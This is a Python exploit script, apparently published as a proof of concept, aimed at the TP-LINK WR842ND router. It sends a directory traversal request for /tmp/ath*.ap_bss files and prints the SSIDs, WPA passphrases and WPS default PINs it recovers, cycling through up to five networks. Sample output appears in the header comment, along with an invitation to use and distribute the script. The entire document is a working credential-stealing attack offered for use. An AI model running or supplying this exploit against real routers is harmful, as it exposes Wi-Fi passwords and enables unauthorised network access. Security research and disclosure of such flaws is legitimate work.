#!/usr/bin/python

'''
TP-LINK WR842ND Remote Multiple SSID Directory Travesal Exploit
Adam Simuntis :: http://unixjail.com

If remote management is on you have full access to router configuration - if not and you're connected
to router network you can discover another configured SSID's. 

 
Successfully tested against TP-LINK WR842ND
Firmware Version:	3.12.22 Build 120424 Rel.39632n

Feel free to use, modify and distribute. 

.-(~)---------------------------------------------------------------------------------(adam@ninja)-
`--> python2 e.py ip:port
TP-LINK WR842ND Remote Multiple SSID Directory Travesal Exploit
Adam Simuntis :: http://unixjail.com

:: Crafting and sending evil request..

-> ssid="some_network"
   !wps_default_pin=01010101
   !wpa_passphrase="secretpsk"


:: Search for another networks? (y/n)
> y

:: Searching..

:: Jumping for SSID 1..

-> ssid="another_network"
   !wps_default_pin=01010101
   !wpa_passphrase="another_secretpsk"

:: Jumping for SSID 2..


:: Jumping for SSID 3..


:: Jumping for SSID 4..

.-(~)---------------------------------------------------------------------------------(adam@ninja)-
`--> 

'''

import requests,sys,socket
from time import sleep

data=''
data2=''
url=''	

W  = '\033[0m'  
R  = '\033[31m' 
B  = '\033[34m' 

#KISS
def parse_data(text):
	words = text.split()

        for word in words :
		if 'ssid' in word and 'ignore' not in word :
			print W+"-> "+B+"%s" %(word)
                if 'pass' in word :
                        print W+"   !"+R+"%s" %(word)
		if 'default_pin' in word :
			print W+"   !"+R+"%s" %(word)
	print W

def make_url(host,n):
	 junk = ("http://%s/help/../../../../../../../../../../../../../../../../tmp/ath%s.ap_bss") % (host,n)
	 return junk

if len(sys.argv) == 1 :
	print "Usage: %s router_ip:port (default port=80)" %(sys.argv[0])
	sys.exit()

url = make_url(sys.argv[1],0)

if ':' in sys.argv[1] :
	host = sys.argv[1].split(":")
else :
	host = sys.argv[1]

headers={
"Host" : host[0],
"User-Agent" : "Mozzila/5.0",
"Referer" : "http://"+host[0]+"/"	
} 

print "TP-LINK WR842ND Remote Multiple SSID Directory Travesal Exploit"
print "Adam Simuntis :: http://unixjail.com\n"

try:
	print R+":: Crafting and sending evil request.."
	print W
	data = requests.get(url,headers=headers).content

except requests.ConnectionError, e:
   print R+":! Connection error!\n"
   sys.exit()

if data :
	parse_data(data)
else :
	print B+":! Ups.. seems to be not vulnerable"
	print W

print "\n:: Search for another networks? (y/n)"
answer = raw_input("> ")

if answer=="y" or answer=="Y" :
	print R+"\n:: Searching.."
	print W

	for i in range(1,5) :

		print W+":: Jumping for SSID %s..\n" %(i)

		sleep(3)
		
		url = make_url(sys.argv[1],i)
		data2 = requests.get(url,headers=headers).content 

		if data2 :
			parse_data(data2)
		else :
			print B+"-> Nothing..\n"
			
else : 
	print W+"\n:: Bye!"
		
print